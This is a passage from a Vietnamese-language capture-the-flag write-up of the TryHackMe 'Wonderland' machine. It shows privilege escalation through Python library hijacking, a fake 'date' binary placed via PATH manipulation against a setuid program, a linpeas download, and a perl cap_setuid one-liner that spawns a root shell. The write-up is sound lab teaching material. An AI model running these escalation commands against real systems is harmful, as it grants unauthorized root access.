</span></span><span class="line"><span class="cl"><span class="n">The</span> <span class="n">line</span> <span class="n">was</span><span class="p">:</span>    <span class="n">Because</span> <span class="n">she</span> <span class="n">thought</span> <span class="n">the</span> <span class="n">sun</span>
</span></span><span class="line"><span class="cl"><span class="n">The</span> <span class="n">line</span> <span class="n">was</span><span class="p">:</span>    <span class="n">The</span> <span class="n">sun</span> <span class="n">was</span> <span class="n">shining</span> <span class="n">on</span> <span class="n">the</span> <span class="n">sea</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="n">The</span> <span class="n">line</span> <span class="n">was</span><span class="p">:</span>    <span class="n">And</span> <span class="n">scrambling</span> <span class="n">to</span> <span class="n">the</span> <span class="n">shore</span><span class="o">.</span>
</span></span><span class="line"><span class="cl"><span class="n">The</span> <span class="n">line</span> <span class="n">was</span><span class="p">:</span>    <span class="n">The</span> <span class="n">Walrus</span> <span class="n">did</span> <span class="n">beseech</span><span class="o">.</span>
</span></span><span class="line"><span class="cl"><span class="n">The</span> <span class="n">line</span> <span class="n">was</span><span class="p">:</span>    <span class="n">To</span> <span class="n">give</span> <span class="n">a</span> <span class="n">hand</span> <span class="n">to</span> <span class="n">each</span><span class="o">.</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">The</span> <span class="n">line</span> <span class="n">was</span><span class="p">:</span>    
</span></span><span class="line"><span class="cl"><span class="n">The</span> <span class="n">line</span> <span class="n">was</span><span class="p">:</span>    <span class="n">I</span><span class="err">’</span><span class="n">ve</span> <span class="n">had</span> <span class="n">to</span> <span class="n">ask</span> <span class="n">you</span> <span class="n">twice</span><span class="err">!</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">The</span> <span class="n">line</span> <span class="n">was</span><span class="p">:</span>    <span class="n">All</span> <span class="n">hopping</span> <span class="n">through</span> <span class="n">the</span> <span class="n">frothy</span> <span class="n">waves</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="n">The</span> <span class="n">line</span> <span class="n">was</span><span class="p">:</span>    <span class="n">Holding</span> <span class="n">his</span> <span class="n">pocket</span> <span class="n">handkerchief</span>
</span></span><span class="line"><span class="cl"><span class="n">alice</span><span class="nd">@wonderland</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> </span></span></code></pre></div></div>

<h2 class="relative group">Privilege escalation
    <div id="privilege-escalation" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#privilege-escalation" aria-label="Anchor">#</a>
    </span>
    
</h2>
<p>Thực sự là tôi đã mất cả 1 buổi sáng để tìm cách khai thác file py này nhưng đều không có tác dụng. Và trong khi lần mò 1 cách vô vọng trên google về các lỗ hổng với file python, tôi tìm thấy <a href="https://www.hackingarticles.in/linux-privilege-escalation-python-library-hijacking/"  target="_blank" rel="noreferrer">cách leo thang đặc quyền bằng thư viện python</a>.</p>
<p>Khi chạy file, python sẽ tìm đến thư mục chứa các gói được import theo thứ tự ưu tiên. Ở đây, trong thư viện của python 3.6 có file random.py nên thay vì để tập lệnh gọi file này, tôi sẽ tạo 1 file random.py chứa payload ở ngay trong thư mục <em>alice</em>.</p>
<p>Tạo file random.py:</p>
<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="cl"><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&#34;/bin/bash&#34;</span><span class="p">)</span></span></span></code></pre></div></div>
<p>Chạy lại file python với user <em>rabbit</em> xem có gì xảy ra không</p>
<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">alice</span><span class="nd">@wonderland</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">sudo</span> <span class="o">-</span><span class="n">u</span> <span class="n">rabbit</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">python3</span><span class="mf">.6</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">alice</span><span class="o">/</span><span class="n">walrus_and_the_carpenter</span><span class="o">.</span><span class="n">py</span> 
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="n">sudo</span><span class="p">]</span> <span class="n">password</span> <span class="k">for</span> <span class="n">alice</span><span class="p">:</span> 
</span></span><span class="line"><span class="cl"><span class="n">rabbit</span><span class="nd">@wonderland</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">pwd</span>
</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">alice</span></span></span></code></pre></div></div>
<p>Vào thư mục của user <em>rabbit</em></p>
<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">rabbit</span><span class="nd">@wonderland</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">rabbit</span><span class="err">$</span> <span class="n">ll</span>
</span></span><span class="line"><span class="cl"><span class="n">total</span> <span class="mi">40</span>
</span></span><span class="line"><span class="cl"><span class="n">drwxr</span><span class="o">-</span><span class="n">x</span><span class="o">---</span> <span class="mi">2</span> <span class="n">rabbit</span> <span class="n">rabbit</span>  <span class="mi">4096</span> <span class="n">May</span> <span class="mi">25</span>  <span class="mi">2020</span> <span class="o">./</span>
</span></span><span class="line"><span class="cl"><span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">6</span> <span class="n">root</span>   <span class="n">root</span>    <span class="mi">4096</span> <span class="n">May</span> <span class="mi">25</span>  <span class="mi">2020</span> <span class="o">../</span>
</span></span><span class="line"><span class="cl"><span class="n">lrwxrwxrwx</span> <span class="mi">1</span> <span class="n">root</span>   <span class="n">root</span>       <span class="mi">9</span> <span class="n">May</span> <span class="mi">25</span>  <span class="mi">2020</span> <span class="o">.</span><span class="n">bash_history</span> <span class="o">-&gt;</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>
</span></span><span class="line"><span class="cl"><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">rabbit</span> <span class="n">rabbit</span>   <span class="mi">220</span> <span class="n">May</span> <span class="mi">25</span>  <span class="mi">2020</span> <span class="o">.</span><span class="n">bash_logout</span>
</span></span><span class="line"><span class="cl"><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">rabbit</span> <span class="n">rabbit</span>  <span class="mi">3771</span> <span class="n">May</span> <span class="mi">25</span>  <span class="mi">2020</span> <span class="o">.</span><span class="n">bashrc</span>
</span></span><span class="line"><span class="cl"><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">rabbit</span> <span class="n">rabbit</span>   <span class="mi">807</span> <span class="n">May</span> <span class="mi">25</span>  <span class="mi">2020</span> <span class="o">.</span><span class="n">profile</span>
</span></span><span class="line"><span class="cl"><span class="o">-</span><span class="n">rwsr</span><span class="o">-</span><span class="n">sr</span><span class="o">-</span><span class="n">x</span> <span class="mi">1</span> <span class="n">root</span>   <span class="n">root</span>   <span class="mi">16816</span> <span class="n">May</span> <span class="mi">25</span>  <span class="mi">2020</span> <span class="n">teaParty</span><span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">rabbit</span><span class="nd">@wonderland</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">rabbit</span><span class="err">$</span> <span class="n">file</span> <span class="n">teaParty</span> 
</span></span><span class="line"><span class="cl"><span class="n">teaParty</span><span class="p">:</span> <span class="n">setuid</span><span class="p">,</span> <span class="n">setgid</span> <span class="n">ELF</span> <span class="mi">64</span><span class="o">-</span><span class="n">bit</span> <span class="n">LSB</span> <span class="n">shared</span> <span class="nb">object</span><span class="p">,</span> <span class="n">x86</span><span class="o">-</span><span class="mi">64</span><span class="p">,</span> <span class="n">version</span> <span class="mi">1</span> <span class="p">(</span><span class="n">SYSV</span><span class="p">),</span> <span class="n">dynamically</span> <span class="n">linked</span><span class="p">,</span> <span class="n">interpreter</span> <span class="o">/</span><span class="n">lib64</span><span class="o">/</span><span class="n">ld</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">x86</span><span class="o">-</span><span class="mf">64.</span><span class="n">so</span><span class="mf">.2</span><span class="p">,</span> <span class="k">for</span> <span class="n">GNU</span><span class="o">/</span><span class="n">Linux</span> <span class="mf">3.2.0</span><span class="p">,</span> <span class="n">BuildID</span><span class="p">[</span><span class="n">sha1</span><span class="p">]</span><span class="o">=</span><span class="mi">75</span><span class="n">a832557e341d3f65157c22fafd6d6ed7413474</span><span class="p">,</span> <span class="ow">not</span> <span class="n">stripped</span></span></span></code></pre></div></div>
<p>Thử chạy file binary này</p>
<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">rabbit</span><span class="nd">@wonderland</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">rabbit</span><span class="err">$</span> <span class="o">./</span><span class="n">teaParty</span> 
</span></span><span class="line"><span class="cl"><span class="n">Welcome</span> <span class="n">to</span> <span class="n">the</span> <span class="n">tea</span> <span class="n">party</span><span class="err">!</span>
</span></span><span class="line"><span class="cl"><span class="n">The</span> <span class="n">Mad</span> <span class="n">Hatter</span> <span class="n">will</span> <span class="n">be</span> <span class="n">here</span> <span class="n">soon</span><span class="o">.</span>
</span></span><span class="line"><span class="cl"><span class="n">Probably</span> <span class="n">by</span> <span class="n">Thu</span><span class="p">,</span> <span class="mi">11</span> <span class="n">Aug</span> <span class="mi">2022</span> <span class="mi">10</span><span class="p">:</span><span class="mi">10</span><span class="p">:</span><span class="mi">09</span> <span class="o">+</span><span class="mi">0000</span>
</span></span><span class="line"><span class="cl"><span class="n">Ask</span> <span class="n">very</span> <span class="n">nicely</span><span class="p">,</span> <span class="ow">and</span> <span class="n">I</span> <span class="n">will</span> <span class="n">give</span> <span class="n">you</span> <span class="n">some</span> <span class="n">tea</span> <span class="k">while</span> <span class="n">you</span> <span class="n">wait</span> <span class="k">for</span> <span class="n">him</span>
</span></span><span class="line"><span class="cl"><span class="n">kk</span>
</span></span><span class="line"><span class="cl"><span class="n">Segmentation</span> <span class="n">fault</span> <span class="p">(</span><span class="n">core</span> <span class="n">dumped</span><span class="p">)</span></span></span></code></pre></div></div>
<p>Tạm thời tôi chưa có ý tưởng gì về file này nên sẽ lấy nó về máy để phân tích.</p>
<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="err">┌──</span><span class="p">(</span><span class="n">neo</span><span class="err">㉿</span><span class="n">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">~</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="err">└─$</span> <span class="n">wget</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.165.85</span><span class="p">:</span><span class="mi">8001</span><span class="o">/</span><span class="n">teaParty</span>
</span></span><span class="line"><span class="cl"><span class="o">--</span><span class="mi">2022</span><span class="o">-</span><span class="mi">08</span><span class="o">-</span><span class="mi">11</span> <span class="mi">05</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="mi">17</span><span class="o">--</span>  <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.165.85</span><span class="p">:</span><span class="mi">8001</span><span class="o">/</span><span class="n">teaParty</span>
</span></span><span class="line"><span class="cl"><span class="n">Connecting</span> <span class="n">to</span> <span class="mf">10.10.165.85</span><span class="p">:</span><span class="mf">8001.</span><span class="o">..</span> <span class="n">connected</span><span class="o">.</span>
</span></span><span class="line"><span class="cl"><span class="n">HTTP</span> <span class="n">request</span> <span class="n">sent</span><span class="p">,</span> <span class="n">awaiting</span> <span class="n">response</span><span class="o">...</span> <span class="mi">200</span> <span class="n">OK</span>
</span></span><span class="line"><span class="cl"><span class="n">Length</span><span class="p">:</span> <span class="mi">16816</span> <span class="p">(</span><span class="mi">16</span><span class="n">K</span><span class="p">)</span> <span class="p">[</span><span class="n">application</span><span class="o">/</span><span class="n">octet</span><span class="o">-</span><span class="n">stream</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">Saving</span> <span class="n">to</span><span class="p">:</span> <span class="err">‘</span><span class="n">teaParty</span><span class="err">’</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">teaParty</span>                                        <span class="mi">100</span><span class="o">%</span><span class="p">[</span><span class="o">====================================================================================================&gt;</span><span class="p">]</span>  <span class="mf">16.42</span><span class="n">K</span>  <span class="mf">52.1</span><span class="n">KB</span><span class="o">/</span><span class="n">s</span>    <span class="ow">in</span> <span class="mf">0.3</span><span class="n">s</span>    
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="mi">2022</span><span class="o">-</span><span class="mi">08</span><span class="o">-</span><span class="mi">11</span> <span class="mi">05</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="mi">18</span> <span class="p">(</span><span class="mf">52.1</span> <span class="n">KB</span><span class="o">/</span><span class="n">s</span><span class="p">)</span> <span class="o">-</span> <span class="err">‘</span><span class="n">teaParty</span><span class="err">’</span> <span class="n">saved</span> <span class="p">[</span><span class="mi">16816</span><span class="o">/</span><span class="mi">16816</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">┌──</span><span class="p">(</span><span class="n">neo</span><span class="err">㉿</span><span class="n">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">~</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="err">└─$</span> <span class="n">strings</span> <span class="n">teaParty</span> 
</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">lib64</span><span class="o">/</span><span class="n">ld</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">x86</span><span class="o">-</span><span class="mf">64.</span><span class="n">so</span><span class="mf">.2</span>
</span></span><span class="line"><span class="cl"><span class="mi">2</span><span class="n">U</span><span class="o">~</span><span class="mi">4</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span><span class="o">.</span><span class="n">so</span><span class="mf">.6</span>
</span></span><span class="line"><span class="cl"><span class="n">setuid</span>
</span></span><span class="line"><span class="cl"><span class="n">puts</span>
</span></span><span class="line"><span class="cl"><span class="n">getchar</span>
</span></span><span class="line"><span class="cl"><span class="n">system</span>
</span></span><span class="line"><span class="cl"><span class="n">__cxa_finalize</span>
</span></span><span class="line"><span class="cl"><span class="n">setgid</span>
</span></span><span class="line"><span class="cl"><span class="n">__libc_start_main</span>
</span></span><span class="line"><span class="cl"><span class="n">GLIBC_2</span><span class="mf">.2.5</span>
</span></span><span class="line"><span class="cl"><span class="n">_ITM_deregisterTMCloneTable</span>
</span></span><span class="line"><span class="cl"><span class="n">__gmon_start__</span>
</span></span><span class="line"><span class="cl"><span class="n">_ITM_registerTMCloneTable</span>
</span></span><span class="line"><span class="cl"><span class="n">u</span><span class="o">/</span><span class="n">UH</span>
</span></span><span class="line"><span class="cl"><span class="p">[]</span><span class="n">A</span>\<span class="n">A</span><span class="p">]</span><span class="n">A</span><span class="o">^</span><span class="n">A_</span>
</span></span><span class="line"><span class="cl"><span class="n">Welcome</span> <span class="n">to</span> <span class="n">the</span> <span class="n">tea</span> <span class="n">party</span><span class="err">!</span>
</span></span><span class="line"><span class="cl"><span class="n">The</span> <span class="n">Mad</span> <span class="n">Hatter</span> <span class="n">will</span> <span class="n">be</span> <span class="n">here</span> <span class="n">soon</span><span class="o">.</span>
</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">echo</span> <span class="o">-</span><span class="n">n</span> <span class="s1">&#39;Probably by &#39;</span> <span class="o">&amp;&amp;</span> <span class="n">date</span> <span class="o">--</span><span class="n">date</span><span class="o">=</span><span class="s1">&#39;next hour&#39;</span> <span class="o">-</span><span class="n">R</span>
</span></span><span class="line"><span class="cl"><span class="n">Ask</span> <span class="n">very</span> <span class="n">nicely</span><span class="p">,</span> <span class="ow">and</span> <span class="n">I</span> <span class="n">will</span> <span class="n">give</span> <span class="n">you</span> <span class="n">some</span> <span class="n">tea</span> <span class="k">while</span> <span class="n">you</span> <span class="n">wait</span> <span class="k">for</span> <span class="n">him</span>
</span></span><span class="line"><span class="cl"><span class="n">Segmentation</span> <span class="n">fault</span> <span class="p">(</span><span class="n">core</span> <span class="n">dumped</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">;</span><span class="o">*</span><span class="mi">3</span><span class="err">$</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">GCC</span><span class="p">:</span> <span class="p">(</span><span class="n">Debian</span> <span class="mf">8.3.0</span><span class="o">-</span><span class="mi">6</span><span class="p">)</span> <span class="mf">8.3.0</span>
</span></span><span class="line"><span class="cl"><span class="n">crtstuff</span><span class="o">.</span><span class="n">c</span>
</span></span><span class="line"><span class="cl"><span class="n">deregister_tm_clones</span>
</span></span><span class="line"><span class="cl"><span class="o">...</span></span></span></code></pre></div></div>
<p>Ở đây, để lấy được thời gian, file sẽ chạy 1 lệnh <code>date</code> nhưng không xác định địa chỉ cụ thể <code>date</code> này nằm ở đâu. Tôi hoàn toàn có thể tạo 1 file thực thi có tên <code>date</code> bên trong thư mục <em>/tmp</em></p>
<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/bin/bash</span>
</span></span><span class="line"><span class="cl"><span class="n">echo</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span></span></span></code></pre></div></div>
<p>Thay đổi quyền cho file bằng <code>chmod +x /tmp/date</code> và thêm path <em>/tmp</em> vào đầu biến PATH để khi chạy file <em>teaParty</em> nó sẽ nhận path <em>/tmp</em> đầu tiên.</p>
<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">rabbit</span><span class="nd">@wonderland</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">rabbit</span><span class="err">$</span> <span class="n">chmod</span> <span class="o">+</span><span class="n">x</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">date</span> 
</span></span><span class="line"><span class="cl"><span class="n">rabbit</span><span class="nd">@wonderland</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">rabbit</span><span class="err">$</span> <span class="n">export</span> <span class="n">PATH</span><span class="o">=/</span><span class="n">tmp</span><span class="p">:</span><span class="err">$</span><span class="n">PATH</span>
</span></span><span class="line"><span class="cl"><span class="n">rabbit</span><span class="nd">@wonderland</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">rabbit</span><span class="err">$</span> <span class="n">echo</span> <span class="err">$</span><span class="n">PATH</span>
</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">tmp</span><span class="p">:</span><span class="o">/</span><span class="n">tmp</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">rabbit</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">sbin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="nb">bin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="p">:</span><span class="o">/</span><span class="n">sbin</span><span class="p">:</span><span class="o">/</span><span class="nb">bin</span><span class="p">:</span><span class="o">/</span><span class="n">snap</span><span class="o">/</span><span class="nb">bin</span>
</span></span><span class="line"><span class="cl"><span class="n">rabbit</span><span class="nd">@wonderland</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">rabbit</span><span class="err">$</span> <span class="o">./</span><span class="n">teaParty</span> 
</span></span><span class="line"><span class="cl"><span class="n">Welcome</span> <span class="n">to</span> <span class="n">the</span> <span class="n">tea</span> <span class="n">party</span><span class="err">!</span>
</span></span><span class="line"><span class="cl"><span class="n">The</span> <span class="n">Mad</span> <span class="n">Hatter</span> <span class="n">will</span> <span class="n">be</span> <span class="n">here</span> <span class="n">soon</span><span class="o">.</span>
</span></span><span class="line"><span class="cl"><span class="n">Probably</span> <span class="n">by</span> 
</span></span><span class="line"><span class="cl"><span class="mi">1337</span>
</span></span><span class="line"><span class="cl"><span class="n">hatter</span><span class="nd">@wonderland</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">rabbit</span><span class="err">$</span> 
</span></span><span class="line"><span class="cl"><span class="n">hatter</span><span class="nd">@wonderland</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">hatter</span><span class="err">$</span> <span class="n">ls</span> 
</span></span><span class="line"><span class="cl"><span class="n">password</span><span class="o">.</span><span class="n">txt</span></span></span></code></pre></div></div>
<p>Vậy là tôi có password của user <em>hatter</em>. Thử login ssh bằng user này. Tuy nhiên thử cả <code>sudo -l</code>, crontab hay tìm file do <em>hatter</em> sở hữu đều không có kết quả. Đến bây giờ thì phải dùng đến <a href="https://github.com/carlospolop/PEASS-ng.git"  target="_blank" rel="noreferrer">linpeas</a>. Tạo http server từ máy local và tải file lên thôi. Sau đó đổi quyền cho file và để nó làm phần việc của mình.</p>
<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">hatter</span><span class="nd">@wonderland</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">wget</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.18.3.74</span><span class="p">:</span><span class="mi">9001</span><span class="o">/</span><span class="n">linpeas</span><span class="o">.</span><span class="n">sh</span>
</span></span><span class="line"><span class="cl"><span class="o">--</span><span class="mi">2022</span><span class="o">-</span><span class="mi">08</span><span class="o">-</span><span class="mi">11</span> <span class="mi">10</span><span class="p">:</span><span class="mi">05</span><span class="p">:</span><span class="mi">56</span><span class="o">--</span>  <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.18.3.74</span><span class="p">:</span><span class="mi">9001</span><span class="o">/</span><span class="n">linpeas</span><span class="o">.</span><span class="n">sh</span>
</span></span><span class="line"><span class="cl"><span class="n">Connecting</span> <span class="n">to</span> <span class="mf">10.18.3.74</span><span class="p">:</span><span class="mf">9001.</span><span class="o">..</span> <span class="n">connected</span><span class="o">.</span>
</span></span><span class="line"><span class="cl"><span class="n">HTTP</span> <span class="n">request</span> <span class="n">sent</span><span class="p">,</span> <span class="n">awaiting</span> <span class="n">response</span><span class="o">...</span> <span class="mi">200</span> <span class="n">OK</span>
</span></span><span class="line"><span class="cl"><span class="n">Length</span><span class="p">:</span> <span class="mi">777018</span> <span class="p">(</span><span class="mi">759</span><span class="n">K</span><span class="p">)</span> <span class="p">[</span><span class="n">text</span><span class="o">/</span><span class="n">x</span><span class="o">-</span><span class="n">sh</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">Saving</span> <span class="n">to</span><span class="p">:</span> <span class="err">‘</span><span class="n">linpeas</span><span class="o">.</span><span class="n">sh</span><span class="err">’</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">linpeas</span><span class="o">.</span><span class="n">sh</span>                                      <span class="mi">100</span><span class="o">%</span><span class="p">[</span><span class="o">====================================================================================================&gt;</span><span class="p">]</span> <span class="mf">758.81</span><span class="n">K</span>   <span class="mi">141</span><span class="n">KB</span><span class="o">/</span><span class="n">s</span>    <span class="ow">in</span> <span class="mf">5.4</span><span class="n">s</span>    
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="mi">2022</span><span class="o">-</span><span class="mi">08</span><span class="o">-</span><span class="mi">11</span> <span class="mi">10</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mi">02</span> <span class="p">(</span><span class="mi">141</span> <span class="n">KB</span><span class="o">/</span><span class="n">s</span><span class="p">)</span> <span class="o">-</span> <span class="err">‘</span><span class="n">linpeas</span><span class="o">.</span><span class="n">sh</span><span class="err">’</span> <span class="n">saved</span> <span class="p">[</span><span class="mi">777018</span><span class="o">/</span><span class="mi">777018</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">hatter</span><span class="nd">@wonderland</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">chmod</span> <span class="o">+</span><span class="n">x</span> <span class="n">linpeas</span><span class="o">.</span><span class="n">sh</span> 
</span></span><span class="line"><span class="cl"><span class="n">hatter</span><span class="nd">@wonderland</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="o">./</span><span class="n">linpeas</span><span class="o">.</span><span class="n">sh</span> </span></span></code></pre></div></div>
<p>Cuối cùng thì tôi cũng tìm được thứ mình cần</p>
<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">Files</span> <span class="k">with</span> <span class="n">capabilities</span> <span class="p">(</span><span class="n">limited</span> <span class="n">to</span> <span class="mi">50</span><span class="p">):</span>
</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">perl5</span><span class="mf">.26.1</span> <span class="o">=</span> <span class="n">cap_setuid</span><span class="o">+</span><span class="n">ep</span>
</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">mtr</span><span class="o">-</span><span class="n">packet</span> <span class="o">=</span> <span class="n">cap_net_raw</span><span class="o">+</span><span class="n">ep</span>
</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">perl</span> <span class="o">=</span> <span class="n">cap_setuid</span><span class="o">+</span><span class="n">ep</span></span></span></code></pre></div></div>
<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">hatter</span><span class="nd">@wonderland</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">ll</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">perl</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">perl5</span><span class="mf">.26.1</span>
</span></span><span class="line"><span class="cl"><span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">--</span> <span class="mi">2</span> <span class="n">root</span> <span class="n">hatter</span> <span class="mi">2097720</span> <span class="n">Nov</span> <span class="mi">19</span>  <span class="mi">2018</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">perl</span><span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">--</span> <span class="mi">2</span> <span class="n">root</span> <span class="n">hatter</span> <span class="mi">2097720</span> <span class="n">Nov</span> <span class="mi">19</span>  <span class="mi">2018</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">perl5</span><span class="mf">.26.1</span><span class="o">*</span></span></span></code></pre></div></div>
<p>Điều này có nghĩa là user <em>hatter</em> có quyền thực thi cũng như quản lý nó. Thử vào <a href="https://gtfobins.github.io"  target="_blank" rel="noreferrer">GTFOBins</a> để tìm perl với Capabilities.</p>
<figure><img
    class="my-0 rounded-md"
    loading="lazy"
    decoding="async"
    fetchpriority="auto"
    alt="perl capabilities"
    width="877"
    height="240"
    src="/ctf/tryhackme/wonderland/8_hu_18792429ae6ea4ec.png"
    srcset="/ctf/tryhackme/wonderland/8_hu_18792429ae6ea4ec.png 800w, /ctf/tryhackme/wonderland/8.png 1280w"
    sizes="(min-width: 768px) 50vw, 65vw"
    data-zoom-src="/ctf/tryhackme/wonderland/8.png"></figure>
<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">hatter</span><span class="nd">@wonderland</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">perl</span> <span class="o">-</span><span class="n">e</span> <span class="s1">&#39;use POSIX qw(setuid); POSIX::setuid(0); exec &#34;/bin/sh&#34;;&#39;</span>
</span></span><span class="line"><span class="cl"><span class="c1"># id</span>
